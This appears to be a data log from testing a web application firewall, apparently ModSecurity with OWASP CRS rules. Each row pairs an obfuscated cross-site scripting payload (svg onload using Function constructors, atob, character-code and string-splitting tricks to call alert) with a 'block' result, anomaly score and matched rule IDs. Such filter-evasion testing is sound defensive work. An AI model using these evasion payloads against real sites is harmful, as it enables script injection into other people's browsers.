2021,"<svg onload=""(function(){const f=window[`\u0061lert`];f(String.fromCharCode(88,83,83))})()""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,98 || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o33,20v217,98t:urlDecodeUni,t:compressWhitespace || ",25,177603514883.607146
2022,"<svg onload=""(function(){const f=window[['\u0061lert'][0]];f(String.fromCharCode(88,83,83))})()""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o33,21v217,103t:urlDecodeUni,t:compressWhitespace || ",25,177603514936.168419
2024,"<svg onload=""(function(){const f=this['\x61lert'];f(String.fromCharCode(88,83,83))})()""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,94 || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o33,16v217,94t:urlDecodeUni,t:compressWhitespace || ",25,177603515175.454325
2025,"<svg onload=""(function(){const f=[window][0]['\x61lert'];f(String.fromCharCode(88,83,83))})()""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o14,11v217,101 || v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603515232.669333
2027,"<svg onload=""(function(){new Function('return ' + atob('YWxlcnQoMSk='))()})()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,11v217,79 || o14,11v217,79t:urlDecodeUni || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603515465.868358
2028,"<svg onload=""(function(){new Function['constructor']('return ' + atob('YWxlcnQoMSk='))()})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,77v217,94t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,94 || o14,11v217,94t:urlDecodeUni || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603515664.380075
2029,"<svg onload=""(function(){new Function('return ' + window['atob']('YWxlcnQoMSk='))()})()"">",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o13,72v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,89 || o14,11v217,89t:urlDecodeUni || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o48,14v217,89t:urlDecodeUni,t:compressWhitespace || ",35,177603515764.904752
2030,"<svg onload=""(function(){new Function('return ' + self['atob']('YWxlcnQoMSk='))()})()"">",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o13,70v217,87t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,87 || o14,11v217,87t:urlDecodeUni || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o48,12v217,87t:urlDecodeUni,t:compressWhitespace || ",35,177603515841.772699
2031,"<svg onload=""(function(){new Function('return ' + this['atob']('YWxlcnQoMSk='))()})()"">",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o13,70v217,87t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,87 || o14,11v217,87t:urlDecodeUni || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o48,12v217,87t:urlDecodeUni,t:compressWhitespace || ",35,177603515960.331334
2032,"<svg onload=""(function(){new Function(String.fromCharCode(114,101,116,117,114,110,32) + atob('YWxlcnQoMSk='))()})()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,11v217,117 || o14,11v217,117t:urlDecodeUni || v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603516087.704064
2033,"<svg onload=""(function(){new Function(['return',atob('YWxlcnQoMSk=')].join(' '))()})()"">",0,1,block,6,"933210,934100,941100,941120,941160,949110","o74,12v217,88t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,88 || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603516160.996245
2034,"<svg onload=""(function(){new Function(`return ${atob('YWxlcnQoMSk=')}`).call()})()"">",0,1,block,6,"932130,934100,941100,941120,941160,949110","o45,31v217,84t:urlDecodeUni,t:cmdLine || o14,11v217,84 || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603516388.380883
2035,"<svg onload=""(function(){new Function(unescape('return%20') + atob('YWxlcnQoMSk='))()})()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,11v217,91 || o14,11v217,91t:urlDecodeUni || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603516473.922291
2036,"<svg onload=""(function(){new Function(decodeURI('return%20') + atob('YWxlcnQoMSk='))()})()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,11v217,92 || o14,11v217,92t:urlDecodeUni || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603516588.521253
2037,"<svg onload=""(function(){[].constructor.constructor('return ' + atob('YWxlcnQoMSk='))()})()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,11v217,93 || o14,11v217,93t:urlDecodeUni || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603516668.654286
2038,"<svg onload=""(function(){''['constructor']['constructor']('return ' + atob('YWxlcnQoMSk='))()})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,82v217,99t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,99 || o14,11v217,99t:urlDecodeUni || v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,17760351674.243709
2040,"<svg onload=""(function(){window['Function']('return ' + atob('YWxlcnQoMSk='))()})()"">",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o13,68v217,85t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,85 || o14,11v217,85t:urlDecodeUni || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,18v217,85t:urlDecodeUni,t:compressWhitespace || ",35,17760351692.931712
2041,"<svg onload=""(function(){self['Function']('return ' + atob('YWxlcnQoMSk='))()})()"">",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o13,66v217,83t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,83 || o14,11v217,83t:urlDecodeUni || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,16v217,83t:urlDecodeUni,t:compressWhitespace || ",35,177603517018.584226
2042,"<svg onload=""(function(){top['Function']('return ' + atob('YWxlcnQoMSk='))()})()"">",0,1,block,9,"932105,933210,934100,934100,941100,941120,941160,941370,949110","o22,6v217,82 || o13,65v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,82 || o14,11v217,82t:urlDecodeUni || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,15v217,82t:urlDecodeUni,t:compressWhitespace || ",40,177603517296.522133
2043,"<svg onload=""(function(){parent['Function']('return ' + atob('YWxlcnQoMSk='))()})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,68v217,85t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,85 || o14,11v217,85t:urlDecodeUni || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603517381.202327
2044,"<svg onload=""(function(){new Function('return ' + atob`YWxlcnQoMSk=`)()})()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,11v217,77 || o14,11v217,77t:urlDecodeUni || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603517439.279028
2045,"<svg onload=""(function(){new Function('return ' + atob.call(null,'YWxlcnQoMSk='))()})()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,11v217,89 || o14,11v217,89t:urlDecodeUni || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603517563.307401
2046,"<svg onload=""(function(){new Function('return ' + atob.apply(null,['YWxlcnQoMSk=']))()})()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,11v217,92 || o14,11v217,92t:urlDecodeUni || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603517687.859019
2047,"<svg onload=""(function(){return this['constr'+'uctor']['constr'+'uctor']('ale'+'rt(1)')()})()""></svg>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o13,80v217,101t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,101 || o14,11v217,101t:urlDecodeUni || v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o32,22v217,101t:urlDecodeUni,t:compressWhitespace || ",35,177603517765.169931
2048,"<svg onload=""(function(){return window['Fun'+'ction']('ale'+'rt(1)')()})()""></svg>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o13,61v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,82 || o14,11v217,82t:urlDecodeUni || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o32,21v217,82t:urlDecodeUni,t:compressWhitespace || ",35,177603517937.675116
2049,"<svg onload=""(function(){return top['Function']('\u0061lert(1)')()})()""></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o13,57v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,78 || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o32,15v217,78t:urlDecodeUni,t:compressWhitespace || ",30,177603518022.289035
2050,"<svg onload=""(function(){return self['co\u006estructor']['constructor']('al\u0065rt(1)')()})()""></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o56,38v217,102t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,102 || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o32,24v217,102t:urlDecodeUni,t:compressWhitespace || ",30,177603518198.286537
2051,"<svg onload=""(function(){return parent['\x46unction']('ale'+'rt(1)')()})()""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o53,21v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,82 || o14,11v217,82t:urlDecodeUni || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603518249.194533
2052,"<svg onload=""(function(){return globalThis['Fu\x6ection']('ale'+'rt(1)')()})()""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o57,21v217,86t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,86 || o14,11v217,86t:urlDecodeUni || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603518323.187805
2053,"<svg onload=""(function(){return[]['constructor']['constructor']('ale'+'rt(1)')()})()""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,71v217,92t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,92 || o14,11v217,92t:urlDecodeUni || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603518464.468353
2054,"<svg onload=""(function(){return{}['constructor']['constructor']('ale'+'rt(1)')()})()""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,71v217,92t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,92 || o14,11v217,92t:urlDecodeUni || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603518553.912679
2055,"<svg onload=""(function(){return/r/['constructor']['constructor']('ale'+'rt(1)')()})()""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,72v217,93t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,93 || o14,11v217,93t:urlDecodeUni || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603518651.757496
2056,"<svg onload=""(function(){return''['constructor']['constructor']('ale'+'rt(1)')()})()""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,71v217,92t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,92 || o14,11v217,92t:urlDecodeUni || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,17760351880.565659
2057,"<svg onload=""(function(){return(0)['constructor']['constructor']('ale'+'rt(1)')()})()""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,72v217,93t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,93 || o14,11v217,93t:urlDecodeUni || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,17760351898.196836
2058,"<svg onload=""(function(){return(!0)['constructor']['constructor']('ale'+'rt(1)')()})()""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o35,51v217,94t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,94 || o14,11v217,94t:urlDecodeUni || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603519016.612381
2059,"<svg onload=""(function(){return Function['constructor']('ale'+'rt(1)')()})()""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,63v217,84t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,84 || o14,11v217,84t:urlDecodeUni || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603519156.164284
2060,"<svg onload=""(function(){return this[String.fromCharCode(70,117,110,99,116,105,111,110)]('ale'+'rt(1)')()})()""></svg>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o88,21v217,117t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,117 || o14,11v217,117t:urlDecodeUni || v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o32,56v217,117t:urlDecodeUni,t:compressWhitespace || ",35,177603519246.008983
2061,"<svg onload=""(function(){return window[atob('RnVuY3Rpb24')]('ale'+'rt(1)')()})()""></svg>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o13,67v217,88t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,88 || o14,11v217,88t:urlDecodeUni || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o32,27v217,88t:urlDecodeUni,t:compressWhitespace || ",35,17760351931.788168
2062,"<svg onload=""(function(){return top[['F','u','n','c','t','i','o','n'].join('')]('ale'+'rt(1)')()})()""></svg>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o74,26v217,108t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,108 || o14,11v217,108t:urlDecodeUni || v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o32,37v217,108t:urlDecodeUni,t:compressWhitespace || ",35,177603519499.407493
2063,"<svg onload=""(function(){return(function(){}.constructor.constructor('ale'+'rt(1)')())})()""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,77v217,98t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,98 || o14,11v217,98t:urlDecodeUni || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,17760351963.212647
2064,"<svg onload=""(function(){return async function(){}['constructor']['constructor']('ale'+'rt(1)')()})()""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,88v217,109t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,109 || o14,11v217,109t:urlDecodeUni || v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603519749.152954
2065,"<svg onload=""(function(){return function*(){}['constructor']['constructor']('ale'+'rt(1)')()})()""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,83v217,104t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,104 || o14,11v217,104t:urlDecodeUni || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603519817.717410
2067,"<svg onload=""(function(){var a=String['fromC'+'harCode'](97,108,101,114,116);window[a](1);})();""></svg>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o37,57v217,103t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,103 || o14,11v217,103t:urlDecodeUni || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o77,9v217,103t:urlDecodeUni,t:compressWhitespace || ",35,177603520051.990417
